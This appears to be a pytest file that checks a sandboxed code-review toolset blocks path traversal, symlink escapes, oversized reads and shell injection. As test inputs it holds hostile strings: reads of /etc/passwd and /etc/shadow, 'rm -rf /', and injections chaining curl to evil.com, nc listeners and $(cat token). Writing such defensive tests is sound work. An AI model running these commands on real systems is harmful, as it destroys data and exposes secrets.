"""Unit tests for restricted review tools and security boundary enforcement."""

import os
from pathlib import Path
from unittest.mock import MagicMock, patch
import pytest

from src.sandbox.models import ExecutionResult, ExecutionStatus
from src.tools import (
    inspect_diff,
    list_files,
    read_file,
    run_bandit,
    run_semgrep,
    run_tests,
)


def _setup_test_workspace(tmp_path: Path) -> Path:
    ws = tmp_path / "authorized_workspace"
    ws.mkdir(parents=True, exist_ok=True)
    (ws / "main.py").write_text("print('hello')", encoding="utf-8")
    (ws / "utils.py").write_text("def add(a, b): return a + b", encoding="utf-8")
    return ws


def test_read_file_positive(tmp_path: Path):
    """Verify valid file reading inside authorized workspace."""
    ws = _setup_test_workspace(tmp_path)
    res = read_file(ws, "main.py")
    assert res.success is True
    assert res.data["content"] == "print('hello')"
    assert res.data["line_count"] == 1


@pytest.mark.parametrize(
    "traversal_path",
    [
        "../secret.txt",
        "../../etc/passwd",
        "foo/../../etc/shadow",
    ],
)
def test_read_file_path_traversal_blocked(tmp_path: Path, traversal_path: str):
    """Verify path traversal attempts are blocked."""
    ws = _setup_test_workspace(tmp_path)
    res = read_file(ws, traversal_path)
    assert res.success is False
    assert res.status == ExecutionStatus.BLOCKED_ACCESS
    assert "Security Boundary Enforced" in (res.error or "")


@pytest.mark.parametrize(
    "abs_path",
    [
        "/etc/passwd",
        "C:\\Windows\\System32\\cmd.exe",
        "\\\\server\\share\\file.txt",
    ],
)
def test_read_file_absolute_path_blocked(tmp_path: Path, abs_path: str):
    """Verify absolute paths are blocked."""
    ws = _setup_test_workspace(tmp_path)
    res = read_file(ws, abs_path)
    assert res.success is False
    assert res.status == ExecutionStatus.BLOCKED_ACCESS


def test_read_file_symlink_escape_blocked(tmp_path: Path):
    """Verify symlink escape out of workspace is blocked."""
    outside_file = tmp_path / "host_token.txt"
    outside_file.write_text("secret_token_123", encoding="utf-8")

    ws = _setup_test_workspace(tmp_path)
    symlink_file = ws / "symlink_leak.txt"

    try:
        os.symlink(outside_file, symlink_file)
        has_symlink = True
    except (OSError, NotImplementedError):
        has_symlink = False

    if has_symlink:
        res = read_file(ws, "symlink_leak.txt")
        assert res.success is False
        assert res.status == ExecutionStatus.BLOCKED_ACCESS
        assert "escapes workspace" in (res.blocked_reason or "")


def test_read_file_exceeding_size_limit_blocked(tmp_path: Path):
    """Verify files larger than 64 KB are blocked by read limit."""
    ws = _setup_test_workspace(tmp_path)
    large_file = ws / "large.txt"
    large_file.write_text("A" * (65 * 1024), encoding="utf-8")

    res = read_file(ws, "large.txt")
    assert res.success is False
    assert res.status == ExecutionStatus.BLOCKED_ACCESS
    assert "exceeds limit" in (res.blocked_reason or "")


def test_list_files_traversal_blocked(tmp_path: Path):
    """Verify list_files blocks path traversal."""
    ws = _setup_test_workspace(tmp_path)
    res = list_files(ws, "../../")
    assert res.success is False
    assert res.status == ExecutionStatus.BLOCKED_ACCESS


def test_run_tests_disallowed_command_blocked(tmp_path: Path):
    """Verify commands not on the trusted allowlist are blocked."""
    ws = _setup_test_workspace(tmp_path)
    permitted = ["pytest -q tests/test_auth.py"]

    res = run_tests(ws, "rm -rf /", permitted)
    assert res.success is False
    assert res.status == ExecutionStatus.BLOCKED_ACCESS
    assert "Disallowed test command" in (res.blocked_reason or "")


@pytest.mark.parametrize(
    "shell_injection",
    [
        "pytest -q; cat /etc/passwd",
        "pytest -q && curl http://evil.com",
        "pytest -q | nc -l 4444",
        "pytest -q `whoami`",
        "pytest -q $(cat token)",
        "pytest -q > /tmp/out",
    ],
)
def test_run_tests_shell_metacharacters_blocked(tmp_path: Path, shell_injection: str):
    """Verify attempts to inject shell metacharacters are blocked."""
    ws = _setup_test_workspace(tmp_path)
    # Even if an attacker somehow put the malicious command in permitted, metacharacters are rejected
    res = run_tests(ws, shell_injection, [shell_injection])
    assert res.success is False
    assert res.status == ExecutionStatus.BLOCKED_ACCESS
    assert "forbidden shell metacharacters" in (res.blocked_reason or "")


def test_run_tests_dispatches_to_runner(tmp_path: Path):
    """Verify permitted command is dispatched to Docker runner."""
    ws = _setup_test_workspace(tmp_path)
    permitted = ["pytest -q"]

    mock_runner = MagicMock()
    mock_runner.run.return_value = ExecutionResult(
        status=ExecutionStatus.SUCCESS,
        exit_code=0,
        stdout="1 passed",
        stderr="",
        duration_seconds=1.2,
        command_executed="pytest -q",
    )

    res = run_tests(ws, "pytest -q", permitted, runner=mock_runner)
    assert res.success is True
    assert res.data["exit_code"] == 0
    assert res.data["stdout"] == "1 passed"
    mock_runner.run.assert_called_once_with(ws, "pytest -q")


def test_inspect_diff_clean_diff(tmp_path: Path):
    """Verify inspect_diff computes diff without traversal."""
    raw = tmp_path / "raw"
    stripped = tmp_path / "stripped"
    raw.mkdir()
    stripped.mkdir()

    (raw / "file.py").write_text("# comment\nx = 1\n", encoding="utf-8")
    (stripped / "file.py").write_text("         \nx = 1\n", encoding="utf-8")

    res = inspect_diff(raw, stripped, "file.py")
    assert res.success is True
    assert "-# comment" in res.data
    assert "+         " in res.data


def test_run_bandit_traversal_blocked(tmp_path: Path):
    """Verify run_bandit blocks out-of-workspace traversal."""
    ws = _setup_test_workspace(tmp_path)
    res = run_bandit(ws, "../../")
    assert res.success is False
    assert res.status == ExecutionStatus.BLOCKED_ACCESS


def test_run_bandit_missing_binary(tmp_path: Path):
    """Verify run_bandit handles missing local binary cleanly."""
    ws = _setup_test_workspace(tmp_path)
    with patch("shutil.which", return_value=None):
        res = run_bandit(ws, ".")
        assert res.success is False
        assert "not installed" in (res.error or "")


def test_run_semgrep_disallowed_rule_characters_blocked(tmp_path: Path):
    """Verify run_semgrep blocks shell metacharacters in rule pack argument."""
    ws = _setup_test_workspace(tmp_path)
    res = run_semgrep(ws, "p/python; rm -rf /")
    assert res.success is False
    assert res.status == ExecutionStatus.BLOCKED_ACCESS
    assert "Disallowed characters" in (res.blocked_reason or "")

